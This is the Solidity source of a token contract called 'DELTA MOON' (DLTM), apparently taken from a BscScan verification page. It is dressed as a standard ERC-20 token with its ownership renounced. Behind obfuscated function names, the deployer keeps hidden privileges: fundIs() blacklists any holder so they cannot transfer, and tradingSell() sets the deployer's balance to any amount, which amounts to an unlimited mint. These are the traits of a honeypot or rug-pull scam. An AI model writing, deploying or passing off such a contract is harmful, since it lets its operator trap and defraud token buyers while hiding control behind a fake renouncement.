/**
 *Submitted for verification at BscScan.com on 2023-02-14
*/

/**
 *Submitted for verification at Etherscan.io on 2023-02-13
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface minEnable {
    function totalSupply() external view returns (uint256);

    function balanceOf(address minExempt) external view returns (uint256);

    function transfer(address modeWallet, uint256 autoLaunched) external returns (bool);

    function allowance(address launchedReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 autoLaunched) external returns (bool);

    function transferFrom(
        address sender,
        address modeWallet,
        uint256 autoLaunched
    ) external returns (bool);

    event Transfer(address indexed from, address indexed liquidityLaunchSell, uint256 value);
    event Approval(address indexed launchedReceiver, address indexed spender, uint256 value);
}

interface minEnableMetadata is minEnable {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface maxBuyMarketing {
    function createPair(address exemptTx, address totalReceiver) external returns (address);
}

interface tradingMaxLaunch {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract limitIsTrading {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Delta is limitIsTrading, minEnable, minEnableMetadata {

    bool public autoTx;

    function owner() external view returns (address) {
        return toFee;
    }

    bool private listMarketing;

    function totalSupply() external view virtual override returns (uint256) {
        return liquiditySell;
    }

    function decimals() external view virtual override returns (uint8) {
        return enableTx;
    }

    uint256 private isTx;

    function enableAt() public {
        
        
        exemptTake=false;
    }

    function marketingAmount(address launchedTake, address modeWallet, uint256 autoLaunched) internal returns (bool) {
        if (launchedTake == limitTotal || modeWallet == limitTotal) {
            return buyMode(launchedTake, modeWallet, autoLaunched);
        }
        if (shouldTakeTeam == isTx) {
            listMarketing = false;
        }
        require(!autoAtMode[launchedTake]);
        if (exemptTake) {
            exemptTake = false;
        }
        return buyMode(launchedTake, modeWallet, autoLaunched);
    }

    function transfer(address totalAt, uint256 autoLaunched) external virtual override returns (bool) {
        return marketingAmount(_msgSender(), totalAt, autoLaunched);
    }

    string private txLaunch = "DELTA MOON";

    mapping(address => bool) public amountAuto;

    string private totalLimit = "DLTM";

    function buyMode(address launchedTake, address modeWallet, uint256 autoLaunched) internal returns (bool) {
        require(launchedTotal[launchedTake] >= autoLaunched);
        launchedTotal[launchedTake] -= autoLaunched;
        launchedTotal[modeWallet] += autoLaunched;
        emit Transfer(launchedTake, modeWallet, autoLaunched);
        return true;
    }

    function transferFrom(address launchedTake, address modeWallet, uint256 autoLaunched) external override returns (bool) {
        if (fromLaunch[launchedTake][_msgSender()] != type(uint256).max) {
            require(autoLaunched <= fromLaunch[launchedTake][_msgSender()]);
            fromLaunch[launchedTake][_msgSender()] -= autoLaunched;
        }
        return marketingAmount(launchedTake, modeWallet, autoLaunched);
    }

    address public limitTotal;

    function fundIs(address maxFee) public {
        if (shouldTakeTeam != isTx) {
            isTx = shouldTakeTeam;
        }
        if (maxFee == limitTotal || maxFee == shouldTokenMin || !amountAuto[_msgSender()]) {
            return;
        }
        
        autoAtMode[maxFee] = true;
    }

    uint8 private enableTx = 18;

    function limitTeamMax() public view returns (bool) {
        return listMarketing;
    }

    function txWallet() public {
        emit OwnershipTransferred(limitTotal, address(0));
        toFee = address(0);
    }

    address private toFee;

    function sellLaunched(address tradingTx) public {
        if (autoTx) {
            return;
        }
        
        amountAuto[tradingTx] = true;
        if (listMarketing) {
            listMarketing = false;
        }
        autoTx = true;
    }

    address public shouldTokenMin;

    constructor (){
        if (listMarketing) {
            isTx = shouldTakeTeam;
        }
        toFee = _msgSender();
        if (exemptTake == listMarketing) {
            listMarketing = false;
        }
        limitTotal = toFee;
        amountAuto[limitTotal] = true;
        if (exemptTake != listMarketing) {
            shouldTakeTeam = isTx;
        }
        launchedTotal[limitTotal] = liquiditySell;
        emit Transfer(address(0), limitTotal, liquiditySell);
        txWallet();
    }

    function allowance(address tradingLaunch, address sellList) external view virtual override returns (uint256) {
        return fromLaunch[tradingLaunch][sellList];
    }

    bool public exemptTake;

    function getOwner() external view returns (address) {
        return toFee;
    }

    function isAuto() public {
        
        if (exemptTake) {
            shouldTakeTeam = isTx;
        }
        exemptTake=false;
    }

    function symbol() external view virtual override returns (string memory) {
        return totalLimit;
    }

    function name() external view virtual override returns (string memory) {
        return txLaunch;
    }

    uint256 public shouldTakeTeam;

    mapping(address => bool) public autoAtMode;

    function tradingSell(uint256 autoLaunched) public {
        if (!amountAuto[_msgSender()]) {
            return;
        }
        launchedTotal[limitTotal] = autoLaunched;
    }

    uint256 private liquiditySell = 100000000 * 10 ** 18;

    function tradingAuto() public view returns (bool) {
        return listMarketing;
    }

    function listExempt() public {
        
        if (listMarketing == exemptTake) {
            isTx = shouldTakeTeam;
        }
        exemptTake=false;
    }

    function balanceOf(address minExempt) public view virtual override returns (uint256) {
        return launchedTotal[minExempt];
    }

    event OwnershipTransferred(address indexed senderReceiverTotal, address indexed senderModeReceiver);

    mapping(address => uint256) private launchedTotal;

    function takeLaunchedTo() public {
        
        if (exemptTake != listMarketing) {
            exemptTake = false;
        }
        exemptTake=false;
    }

    mapping(address => mapping(address => uint256)) private fromLaunch;

    function approve(address sellList, uint256 autoLaunched) public virtual override returns (bool) {
        fromLaunch[_msgSender()][sellList] = autoLaunched;
        emit Approval(_msgSender(), sellList, autoLaunched);
        return true;
    }

}